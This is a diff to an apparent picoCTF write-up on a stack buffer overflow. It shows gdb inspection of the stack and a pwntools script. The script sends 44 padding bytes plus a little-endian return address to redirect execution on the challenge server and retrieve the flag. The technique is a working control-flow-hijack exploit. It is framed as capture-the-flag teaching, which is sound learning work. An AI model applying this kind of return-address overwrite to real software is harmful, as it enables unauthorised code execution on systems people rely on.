@@ -76,31 +76,37 @@ disas vuln
 
 We set a breakpoint directly after the ``gets()`` call (``<vuln>+34``) with ``b *vuln+34``. Then, we run and input 32 ``A``'s, so we can also see the buffer dimension. At the breakpoint, we inspect the first 80 bytes in memory from stack the stack pointer (``$esp``).
 
+![Stack View](images/picoctf_bufferoverflow.png)
+
+Notice the little endianness. 
+
 
 The buffer is clearly visible from the 32 A (``0x41``) characters from address ``0xffffd320`` to ``0xffffd33f`` (highlighted red). Knowing x86 processors store in little endian, we also find the return address from address ``0xffffd34c`` to ``0xffffd34f``. We can calculate our input from the image:
 
 ```
-((Buffer) 32 bytes + 12 bytes) * A + 0xf6 + 0x91
+((Buffer) 32 bytes + 12 bytes) * A + 0xf6 + 0x91 + 0x04 + 0x08
 ```
-
-Notice, we only changed the last two bytes of the return address because the 2 most significant bytes in the address are identical. 
 
 We generate the exploiting input:
 
 ```python
 from pwn import *
-payload = 44 * b"\x41" + b"\xf6\x91"
 
-sh = process("./vuln")
-sh.recvline(timeout=1)
-sh.sendline(payload)
-print(sh.recvline(timeout=1))
-sh.close()
+payload = 44 * b"\x41" + b"\xf6\x91\x04\x08"
+conn = remote("saturn.picoctf.net", 49348)
+conn.recvuntil(b"Please enter your string: ", drop=True)
+
+conn.sendline(payload)
+print(conn.recvline(timeout=1))
+print(conn.recvline(timeout=1))
+print(conn.recvline(timeout=1))
+conn.close()
 ```
 
-and input it to the program:
+And receive the flag:
 
-```
+![Flag](images/picoctf_bufferoverflow_flag.png)
+
 
 
 
